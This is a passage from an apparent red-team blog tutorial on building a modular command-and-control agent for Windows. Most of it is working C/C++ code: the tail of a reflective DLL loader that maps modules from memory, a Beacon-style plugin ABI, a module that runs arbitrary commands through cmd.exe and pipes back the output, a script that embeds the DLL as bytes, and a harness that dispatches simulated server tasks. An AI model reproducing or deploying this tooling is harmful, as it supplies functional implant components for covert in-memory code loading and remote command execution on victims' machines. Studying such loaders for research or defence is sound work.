    DWORD_PTR delta = (DWORD_PTR)base - nt->OptionalHeader.ImageBase;
    if (delta && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto reloc = (PIMAGE_BASE_RELOCATION)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        auto end = (uint8_t*)reloc + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        while ((uint8_t*)reloc < end && reloc->SizeOfBlock) {
            size_t count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto list = (WORD*)(reloc + 1);
            for (size_t i = 0; i < count; ++i) {
                WORD typeOff = list[i];
                WORD type = typeOff >> 12;
                WORD off = typeOff & 0x0FFF;
#ifdef _WIN64
                if (type == IMAGE_REL_BASED_DIR64) {
                    auto* p = (ULONG_PTR*)(base + reloc->VirtualAddress + off);
                    *p += delta;
                }
#else
                if (type == IMAGE_REL_BASED_HIGHLOW) {
                    auto* p = (ULONG_PTR*)(base + reloc->VirtualAddress + off);
                    *p += delta;
                }
#endif
            }
            reloc = (PIMAGE_BASE_RELOCATION)((uint8_t*)reloc + reloc->SizeOfBlock);
        }
    }

    // Imports
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        for (; imp->Name; ++imp) {
            const char* lib = (const char*)(base + imp->Name);
            HMODULE m = LoadLibraryA(lib);
            if (!m) continue;

            auto thunk = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
            auto origThunk = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
            for (; thunk->u1.AddressOfData; ++thunk, ++origThunk) {
                FARPROC addr = nullptr;
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    addr = GetProcAddress(m, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                }
                else {
                    auto ibn = (PIMAGE_IMPORT_BY_NAME)(base + origThunk->u1.AddressOfData);
                    addr = GetProcAddress(m, (LPCSTR)ibn->Name);
                }
#ifdef _WIN64
                thunk->u1.Function = (ULONGLONG)addr;
#else
                thunk->u1.Function = (DWORD)addr;
#endif
            }
        }
    }

    // Final section protections
    sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        DWORD prot = ProtectFromSectionChars(sec->Characteristics);
        DWORD old;
        SIZE_T size = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        if (size)
            VirtualProtect(base + sec->VirtualAddress, size, prot, &old);
    }

    // Make headers RX or at least R
    {
        DWORD old;
        VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old);
    }

    VirtualFree(raw, 0, MEM_RELEASE);
    return base;
}
```

From here, you can call your custom export resolver against the returned base.

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#plugin-abi)    Plugin ABI

#### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#task-payload)    Task payload

I like a plain C struct of `char* + length` pairs so modules can stay light and avoid high-level runtime baggage if they want.

Copy

```
typedef struct TaskApi {
    const char* TaskId;        DWORD TaskIdLen;
    const char* Instruction;   DWORD InstructionLen;
    const char* Command;       DWORD CommandLen;
    const char* Arguments;     DWORD ArgumentsLen;
    const char* File;          DWORD FileLen;
    const char* ExecTime;      DWORD ExecTimeLen;
} TaskApi;
```

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#interface-and-exports)    Interface & exports

Keep the ABI tiny and predictable:

- Factory: `create_plugin() → IPlugin*`

- Lifecycle: `plugin_init(IPlugin*)`, `plugin_cleanup(IPlugin*)`

- Dispatch: `plugin_exec(TaskApi* task)`

- Inside the module: `init()`, `execute(TaskApi*)`, `cleanup()`


Copy

```
class IPlugin {
public:
    virtual void init()   const = 0;
    virtual void execute(TaskApi* task) const = 0;
    virtual void cleanup() const = 0;
    virtual ~IPlugin() = default;
};
```

Keep the same calling convention across the interface and your host typedefs.

Next, some helper functions which I recently came to realize. This is the moment I realized where the Beacon\* API functions that the cobalt strike beacon uses come from:

Copy

```
static inline DWORD CStrLenA(const char* s) {
    return s ? (DWORD)lstrlenA(s) : 0;
}

static void BeaconCout(const char* s, DWORD len = 0) {
    if (!s) return;
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!hOut || hOut == INVALID_HANDLE_VALUE) return;
    if (len == 0) len = (DWORD)lstrlenA(s);
    DWORD n = 0;
    WriteFile(hOut, s, len, &n, nullptr);
}

static void BeaconPipeOutput(HANDLE hRead) {
    BYTE buf[4096];
    for (;;) {
        DWORD got = 0;
        if (!ReadFile(hRead, buf, sizeof(buf), &got, nullptr) || got == 0) break;
        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut && hOut != INVALID_HANDLE_VALUE) {
            DWORD wrote = 0;
            WriteFile(hOut, buf, got, &wrote, nullptr);
        }
    }
}
```

We need these due to the fact that the loaded DLL will execute its own code internally, but we need it to output any information to `stdout`. In order to achieve this, we need to create wrapper functions around the `WriteFile` API which displays to standard output.

Next, we create `CRT-free` memory allocation/deallocation helpers which are just wrappers around the `HeapAlloc`/`HeapFree` API to allocate the instance of the plugin and destroy it accordingly:

Copy

```
extern "C" IPlugin* __stdcall create_plugin() {
    if (g_plugin) return g_plugin;
    void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Plugin));
    if (!mem) return nullptr;
    g_plugin = ::new (mem) Plugin();
    return g_plugin;
}

extern "C" void __stdcall destroy_plugin(IPlugin* p) {
    if (!p) return;
    p->~IPlugin();
    HeapFree(GetProcessHeap(), 0, p);
    if (p == g_plugin) g_plugin = nullptr;
}
```

Finally, we create the export functions which the agent will receive in order to handle the DLL:

Copy

```
extern "C" void __stdcall plugin_init(IPlugin* p) {
    if (!p) p = create_plugin();
    if (p) p->init();
}

extern "C" void __stdcall plugin_exec(TaskApi* task) {
    if (!g_plugin) g_plugin = create_plugin();
    if (g_plugin) g_plugin->execute(task);
}

extern "C" void __stdcall plugin_cleanup(IPlugin* p) {
    if (!p) p = g_plugin;
    if (p) p->cleanup();
}
```

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#example-module-command-execution)    Example Module: Command Execution

Here’s a simple module that runs a command via `CreateProcess` with an inherited pipe, and streams stdout/stderr back through your chosen channel:

Copy

```
#include <Windows.h>
#include <new>
#include "IPlugin.h"

// ---------- run command & pipe to current console ----------
static DWORD RunAndPipeToConsole(const char* cmd, DWORD cmdLen) {
    // Default to "whoami" if none provided
    static const char kDefault[] = "whoami";
    if (!cmd || cmdLen == 0) {
        cmd    = kDefault;
        cmdLen = (DWORD)sizeof(kDefault) - 1;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return GetLastError();
    // Child inherits only the write end
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    PROCESS_INFORMATION pi{};

    // Build mutable "cmd.exe /c <cmd>"
    static const char kPrefix[] = "C:\\Windows\\System32\\cmd.exe /c ";
    const DWORD prefixLen = (DWORD)sizeof(kPrefix) - 1;
    const DWORD totalLen  = prefixLen + cmdLen;

    char* full = (char*)HeapAlloc(GetProcessHeap(), 0, totalLen + 1);
    if (!full) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return ERROR_OUTOFMEMORY;
    }
    CopyMemory(full, kPrefix, prefixLen);
    CopyMemory(full + prefixLen, cmd, cmdLen);
    full[totalLen] = '\0';

    BOOL ok = CreateProcessA(
        nullptr,
        full,                 // mutable buffer
        nullptr, nullptr,
        TRUE,                 // inherit write end
        0,
        nullptr, nullptr,
        &si, &pi
    );

    CloseHandle(hWrite);      // parent never writes

    if (!ok) {
        DWORD le = GetLastError();
        HeapFree(GetProcessHeap(), 0, full);
        CloseHandle(hRead);
        return le;
    }

    BeaconPipeOutput(hRead);

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0; GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    HeapFree(GetProcessHeap(), 0, full);
    return code;
}
```

Keep this logic **with the module**, not in the shared header—otherwise every plugin drags command-runner baggage along for the ride. Compile this DLL using the following command:

Copy

```
cl.exe /W0 /D_USRDLL /D_WINDLL *.cpp /MT /link /DLL /OUT:cmdplugin.dll
```

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#embedding-a-dll-as-bytes-for-testing)    Embedding a DLL as Bytes (for Testing)

I keep a tiny script around that turns a compiled DLL into a C/C++ byte array for fast experiments:

Copy

```
import sys
import os
from textwrap import wrap

def file_to_cpp_hex_array(filename, var_name="embeddedBytes", bytes_per_line=16):
    try:
        with open(filename, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"Failed to read file: {e}")
        return

    size = len(data)
    hex_lines = []
    for line in wrap(data.hex(), bytes_per_line * 2):  # 2 hex chars per byte
        hex_bytes = ", ".join(f"0x{line[i:i+2]}" for i in range(0, len(line), 2))
        hex_lines.append(f"    {hex_bytes},")

    cpp_code = f"""\
#include <cstdint>

constexpr std::size_t {var_name}_size = {size};

const uint8_t {var_name}[] = {{
{os.linesep.join(hex_lines)}
}};
"""
    print(cpp_code)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 file2hex.py <filename> [var_name]")
    else:
        file_to_cpp_hex_array(
            filename=sys.argv[1],
            var_name=sys.argv[2] if len(sys.argv) >= 3 else "embeddedBytes"
        )
```

Executing this script with the output piped to `clip`:

Copy

```
python .\file2hex.py .\cmdplugin.dll cmd_dll | clip
```

Yields the following to your clipboard which you can save in `TestDll.h`:

Copy

```
#include <cstdint>

constexpr std::size_t cmd_dll_size = 105472;

const uint8_t cmd_dll[] = {
    0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,

    0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ...
    ...
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
```

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#host-test-harness)    Host Test Harness

A simple harness maps the module once, resolves exports, constructs the plugin, and dispatches a test task.

Watch out though, the variable does contain 13000+ lines.

We plug this in to our test reflective loader and we proceed to test it! We will be using the following to execute our command:

Copy

```
#include <iostream>

#include "IPlugin.h"
#include "TestDll.h"
#include "ReflectiveLoaderEngine.h"

using CreatePlugin_t = IPlugin * (__stdcall*)();
using DestroyPlugin_t = void(__stdcall*)(IPlugin*);
using PluginInit_t = void(__stdcall*)(IPlugin*);
using PluginExec_t = void(__stdcall*)(const TaskApi*);
using PluginCleanup_t = void(__stdcall*)(IPlugin*);

void Test_Extension_CMD(const char* cmd) {
    MemModule mod = MapImage(cmd_dll, cmd_dll_size);
    if (!mod.base) { std::cerr << "[-] map failed\n"; return; }

    auto create_plugin = (CreatePlugin_t)GetExport(mod, "create_plugin");
    auto destroy_plugin = (DestroyPlugin_t)GetExport(mod, "destroy_plugin");
    auto plugin_init = (PluginInit_t)GetExport(mod, "plugin_init");
    auto plugin_exec = (PluginExec_t)GetExport(mod, "plugin_exec");
    auto plugin_cleanup = (PluginCleanup_t)GetExport(mod, "plugin_cleanup");

    if (!create_plugin || !destroy_plugin || !plugin_init || !plugin_exec || !plugin_cleanup) {
        std::cerr << "[-] missing one or more exports\n"; return;
    }

    IPlugin* plugin = create_plugin();
    if (!plugin) { std::cerr << "[-] create_plugin returned null\n"; return; }

    plugin_init(plugin);

    TaskApi task{};
    task.TaskId = "local-test";   task.TaskIdLen = (DWORD)lstrlenA(task.TaskId);
    task.Instruction = "exec";         task.InstructionLen = (DWORD)lstrlenA(task.Instruction);
    task.Command = cmd;            task.CommandLen = (cmd ? (DWORD)lstrlenA(cmd) : 0);

    plugin_exec(&task);
    plugin_cleanup(plugin);
    destroy_plugin(plugin);
}

void main() {
    // This is simulating an instruction received by your server.
    // Assume the command is "dir"
    TaskApi* task = new TaskApi;
    task->Command = "dir";
    Test_Extension_CMD(task->Command);
}
```

![](https://racoten.gitbook.io/red-team-developments-and-operations/~gitbook/image?url=https%3A%2F%2F635941030-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUjs53gB96valSUAXKAm1%252Fuploads%252FpTckEehWRzrFF7Bwi03M%252FPasted%2520image%252020250918130729.png%3Falt%3Dmedia%26token%3Dd9ad9094-9042-4618-b8f4-ba53fbeee0d5&width=768&dpr=3&quality=100&sign=2c1f4ed5&sv=2)

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#checklist-for-the-harness)    Checklist for the harness:

- Map **once** and resolve all exports from **that same** mapped base.

- Create/destroy via the exported functions (don’t mix in `delete`).

- Pass a fully populated `TaskApi*` (use `null+0` for absent fields).

- Clean up handles and free buffers even on error paths.


* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#extensions)    Extensions

Once the ABI is in place, adding modules is boring—in a good way:

- `init()` for per-module setup

- `execute(TaskApi*)` for the actual work

- `cleanup()` for teardown


The agent doesn’t need to know _how_ you did it—only how to map, resolve, and call.

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#iplugin.h)    IPlugin.h

Here’s the full `IPlugin.h` you can standardize on:

Copy

```
#pragma once
#include <Windows.h>

#ifndef PLUGIN_CALL
#define PLUGIN_CALL __stdcall
#endif

#ifndef PLUGIN_EXPORT
#define PLUGIN_EXPORT extern "C" __declspec(dllexport)
#endif

typedef struct TaskApi {
    const char* TaskId;        DWORD TaskIdLen;
    const char* Instruction;   DWORD InstructionLen;
    const char* Command;       DWORD CommandLen;
    const char* Arguments;     DWORD ArgumentsLen;
    const char* File;          DWORD FileLen;
    const char* ExecTime;      DWORD ExecTimeLen;
} TaskApi;

class IPlugin {
public:
    virtual void init()   const = 0;
    virtual void execute(TaskApi* task) const = 0;
    virtual void cleanup() const = 0;
    virtual ~IPlugin() = default;
};

static inline DWORD CStrLenA(const char* s) {
    return s ? (DWORD)lstrlenA(s) : 0;
}

static void BeaconCout(const char* s, DWORD len = 0) {
    if (!s) return;
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!hOut || hOut == INVALID_HANDLE_VALUE) return;
    if (len == 0) len = (DWORD)lstrlenA(s);
    DWORD n = 0;
    WriteFile(hOut, s, len, &n, nullptr);
}

static void BeaconPipeOutput(HANDLE hRead) {
    BYTE buf[4096];
    for (;;) {
        DWORD got = 0;
        if (!ReadFile(hRead, buf, sizeof(buf), &got, nullptr) || got == 0) break;
        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut && hOut != INVALID_HANDLE_VALUE) {
            DWORD wrote = 0;
            WriteFile(hOut, buf, got, &wrote, nullptr);
        }
    }
}

static inline void* PluginAlloc(SIZE_T sz, BOOL zero = TRUE) {
    return HeapAlloc(GetProcessHeap(), zero ? HEAP_ZERO_MEMORY : 0, sz);
}
static inline void  PluginFree(void* p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}

PLUGIN_EXPORT IPlugin* PLUGIN_CALL create_plugin();
PLUGIN_EXPORT void     PLUGIN_CALL destroy_plugin(IPlugin*);

PLUGIN_EXPORT void     PLUGIN_CALL plugin_init(IPlugin*);
PLUGIN_EXPORT void     PLUGIN_CALL plugin_exec(TaskApi* task);
PLUGIN_EXPORT void     PLUGIN_CALL plugin_cleanup(IPlugin*);
```

* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#going-forward)    Going Forward

If you want this to scale without pain:

- Keep a single **canonical header** for the ABI and shared helpers.

- Decide “CRT or no CRT” per module and document it.

- Be explicit about what your mapper supports (relocs/imports/protections) and what it doesn’t (TLS, delay-load, forwarded exports, CFG, SEH tables).

- Add targeted tests (missing imports, weird sections, map/unmap cycles). Future-you will be grateful.


* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#conclusions)    Conclusions

If there’s a single lesson I’m taking away from this little adventure, it’s that “reflective loading” stops being a magic trick the moment you understand the moving parts. It’s just the PE lifecycle—headers, sections, relocations, imports, protections—played back on your own terms. That doesn’t make it trivial (I lost entire evenings to off-by-one bugs in relocation blocks and forgetting to set final page protections), but it does make it tractable. And once you can map a DLL from bytes reliably, a clean plugin ABI feels like the obvious next step rather than a leap of faith.

The second lesson is about restraint. It’s tempting to bolt every clever idea onto the mapper: TLS callbacks, delay-loads, forwarded exports, CFG tables, SEH registration, thread-local storage, the works. Ask me how I know. In practice, the small boring mapper that does the minimum well is the one you’ll trust to ship. Push anything module-specific into the modules. Keep the interface tight and predictable. When you need to extend it, extend it deliberately—prefer an extra field in your task struct over a one-off “special case” that only one module understands.

There are tradeoffs worth calling out. Compared to BOFs, reflective DLLs can feel heavier and noisier; compared to regular DLLs, they can be brittle if your mapper only supports a subset of PE features. That’s okay—just be explicit about your contract. Document what your loader guarantees (relocs/imports/protections) and what it doesn’t (TLS, delay-load, forwarded exports). If a module needs something exotic, either teach the mapper that one new trick or reject the module early with a clear error. Silent half-support is the worst failure mode..

Finally, a note on scope and responsibility. Techniques like these are powerful, and like most powerful things, they can be used in ways that help or harm. For my part, this work came out of curiosity about loaders, a desire to build smaller, more modular tooling, and a genuine love for understanding how Windows actually works under the hood. If you take anything from this post, let it be the craft: build carefully, measure honestly, write down the edges, and leave it cleaner than you found it.

* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#references-for-further-reading)    References (for further reading)

- **Stephen Fewer — Reflective DLL Injection (paper & code)**



  - Code: [stephenfewer/ReflectiveDLLInjection (GitHub)arrow-up-right](https://github.com/stephenfewer/ReflectiveDLLInjection)


- **ired.team — Manual mapping / PE loader notes**



  - Overview: [Reflective DLL Injectionarrow-up-right](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection)

  - Supporting technique: Dynamically Resolve API Addresses via PEB [Microsoft Learnarrow-up-right](https://learn.microsoft.com/en-us/cpp/build/getprocaddress?view=msvc-170)


- **MemoryModule (Joachim Bauch) — “Load a DLL from memory” library & tutorial**



  - Library: [fancycode/MemoryModule (GitHub)arrow-up-right](https://github.com/fancycode/MemoryModule)

  - Tutorial: [Loading a DLL from memory (joachim-bauch.de)arrow-up-right](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/)


- **Microsoft Learn — PE/COFF spec, IMAGE** structures, loader-relevant APIs\_\*



  - PE/COFF spec: [PE Formatarrow-up-right](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) [Microsoft Learnarrow-up-right](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)

  - IMAGE headers: [IMAGE\_NT\_HEADERS32arrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32) · [IMAGE\_NT\_HEADERS64arrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64) · [IMAGE\_FILE\_HEADERarrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header) [Microsoft Learnarrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32)

  - APIs: VirtualAlloc · [VirtualProtectarrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) · CreateProcessA · [CreatePipearrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe) [Microsoft Learnarrow-up-right](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)


- **Windows Internals, Part 1 (7th Edition)**



  - Publisher page: Windows Internals, Part 1, 7th Edition (Microsoft Press Store) [Microsoft Press Storearrow-up-right](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188)


- **Practical Reverse Engineering (Dang, Gazet, Bachaalany, Josse)**



  - Publisher page: [Practical Reverse Engineering (Wiley)arrow-up-right](https://www.wiley.com/en-us/Practical+Reverse+Engineering%3A+x86%2C+x64%2C+ARM%2C+Windows+Kernel%2C+Reversing+Tools%2C+and+Obfuscation-p-9781118787311) [Wileyarrow-up-right](https://www.wiley.com/en-us/Practical%2BReverse%2BEngineering%3A%2Bx86%2C%2Bx64%2C%2BARM%2C%2BWindows%2BKernel%2C%2BReversing%2BTools%2C%2Band%2BObfuscation-p-9781118787311)


- **Think Like a Programmer (V. Anton Spraul)**



  - Publisher page: [Think Like a Programmer (No Starch Press)arrow-up-right](https://nostarch.com/thinklikeaprogrammer)


Last updated 4 months ago